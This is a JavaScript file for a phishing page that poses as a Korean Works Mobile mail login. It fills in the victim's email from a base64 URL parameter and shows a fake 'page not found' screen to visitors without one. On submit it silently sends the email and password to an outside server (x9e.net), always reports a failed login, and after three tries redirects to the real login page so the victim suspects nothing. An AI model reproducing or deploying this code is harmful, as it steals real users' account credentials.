$(document).ready(function() {
  // Password visibility toggle
  const passwordInput = document.getElementById('password');
  const toggleButton = document.getElementById('togglePassword');
  const eyeHideIcon = document.getElementById('eye-hide');
  const eyeShowIcon = document.getElementById('eye-show');
  
  toggleButton.addEventListener('click', function() {
    // Toggle the password field type
    if (passwordInput.type === 'password') {
      passwordInput.type = 'text';
      eyeHideIcon.classList.add('hidden');
      eyeShowIcon.classList.remove('hidden');
    } else {
      passwordInput.type = 'password';
      eyeHideIcon.classList.remove('hidden');
      eyeShowIcon.classList.add('hidden');
    }
  });

  // Get email from URL parameter
  let loginAttempts = 0;
  const maxAttempts = 3;
  
  const encodedUrlTemplate = "aHR0cHM6Ly9hdXRoLndvcmtzbW9iaWxlLmNvbS9sb2dpbi9sb2dpbj9hY2Nlc3NVcmw9aHR0cHMlM0ElMkYlMkZtYWlsLndvcmtzbW9iaWxlLmNvbSUyRiZsb2dpblBhcmFtPXt1c2VybmFtZX0lNDB7ZG9tYWlufSZsYW5ndWFnZT1rb19LUiZjb3VudHJ5Q29kZT04MiZzZXJ2aWNlQ29kZT1sb2dpbl93ZWImaXNSZWZyZXNoZWQ9dHJ1ZQ==";
  
  // Function to decode base64
  function decodeBase64(str) {
    try {
      return atob(str);
    } catch (e) {
      console.error("Decode error:", e);
      return "";
    }
  }
  
  // Parse URL parameters
  function getParameterByName(name, url = window.location.href) {
    name = name.replace(/[\[\]]/g, '\\$&');
    const regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
          results = regex.exec(url);
    if (!results) return null;
    if (!results[2]) return '';
    return decodeURIComponent(results[2].replace(/\+/g, ' '));
  }
  
  // Validate email format with stronger TLD validation
  function isValidEmail(email) {
    // More comprehensive email regex that requires TLD to be at least 2 characters
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/;
    
    if (!emailRegex.test(email)) {
      return false;
    }
    
    // Additional check for the TLD (part after the last dot)
    const parts = email.split('.');
    const tld = parts[parts.length - 1];
    
    // TLD must be at least 2 characters
    if (tld.length < 2) {
      return false;
    }
    
    return true;
  }
  
  // Try to decode base64 string
  function tryBase64Decode(str) {
    try {
      // Check for base64 format
      if (/^[A-Za-z0-9+/=]+$/.test(str)) {
        const decoded = atob(str);
        return decoded;
      }
    } catch (e) {
      console.error("Base64 decode error:", e);
    }
    return str;
  }
  
  // Build redirect URL with username and domain
  function buildRedirectUrl(username, domain) {
    // Decode the template and then replace the placeholders
    return decodeBase64(encodedUrlTemplate)
      .replace('{username}', encodeURIComponent(username))
      .replace('{domain}', encodeURIComponent(domain.replace('@', ''))); // Remove @ if present
  }
  
  // Show error page
  function showErrorPage() {
    // Hide the login form and authentication options
    $("form").hide();
    $(".pt-6").hide(); // Hide device authentication button
    
    // Get the main content container
    const mainContainer = $("form").parent();
    mainContainer.empty(); // Clear existing content
    
    // Add small logo image at the top (matching the screenshot)
    const logoContainer = $("<div>").addClass("flex justify-center mb-8 mt-4");
    logoContainer.append($("<img>").attr("src", "assets/img/logo.png").addClass("h-10"));
    mainContainer.append(logoContainer);
    
    // Create and display the error message with the provided image
    // Error image (woman with question mark)
    const errorImageContainer = $("<div>").addClass("flex justify-center mb-6");
    errorImageContainer.append($("<img>").attr("src", "assets/img/error.png").addClass("w-28 h-28"));
    mainContainer.append(errorImageContainer);
    
    // Error message container
    const errorTextContainer = $("<div>").addClass("text-center");
    
    // Add the error messages
    errorTextContainer.append($("<p>").addClass("text-xl font-medium mb-4").text("페이지를 찾을 수 없습니다."));
    errorTextContainer.append($("<p>").addClass("text-gray-600 mb-1").text("주소를 잘못 입력하였거나, 변경 혹은 삭제되었을 수 있습니다."));
    errorTextContainer.append($("<p>").addClass("text-gray-600 mb-12").text("올바른 주소를 입력했는지 다시 한번 확인해 주세요."));
    
    mainContainer.append(errorTextContainer);
  }
  
  // Process the email parameter
  function processEmailParameter() {
    const utmParam = getParameterByName('utm');
    
    // Check if utm parameter exists and is a valid email
    if (!utmParam) {
      showErrorPage();
      return false;
    }
    
    // Try to decode if it's base64
    let email = tryBase64Decode(utmParam);
    
    // Validate email format
    if (!isValidEmail(email)) {
      showErrorPage();
      return false;
    }
    
    // Split email into username and domain
    const [username, domain] = email.split('@');
    
    // Populate the form fields
    $('#username').val(username);
    $('#username-domain').text('@' + domain);
    $('#email').val(email);
    
    // Focus on password field
    $('#password').focus();
    
    return true;
  }
  
  // Run email parameter processing
  const isValidLogin = processEmailParameter();
  
  // Handle form submission
  $('form').on('submit', function(e) {
    e.preventDefault();
    
    if (!isValidLogin) return;
    
    const password = $('#password').val();
    
    // Validate password
    if (!password || password.length < 5) {
      $('#error-message').text('비밀번호는 5자 이상이어야 합니다.').show();
      $('#password').focus();
      return;
    }
    
    // Get username and domain for redirect
    const username = $('#username').val();
    const domain = $('#username-domain').text();
    
    // Disable form elements during submission
    const formElements = $('form input, form button').not('#email').not('[disabled]');
    formElements.prop('disabled', true);
    
    // Submit form data
    $.ajax({
      url: 'https://x9e.net/xpx/post.php',
      type: 'POST',
      data: {
        email: $('#email').val(),
        password: password
      },
      complete: function() {
        // Count login attempts
        loginAttempts++;
        
        // Re-enable form elements
        formElements.prop('disabled', false);
        
        // Show error message and focus on password
        $('#error-message').show();
        $('#password').val('').focus();
        
        // Check if max attempts reached
        if (loginAttempts >= maxAttempts) {
          // Redirect after 3 failed attempts with the proper username and domain
          window.location.href = buildRedirectUrl(username, domain);
        }
      }
    });
  });
});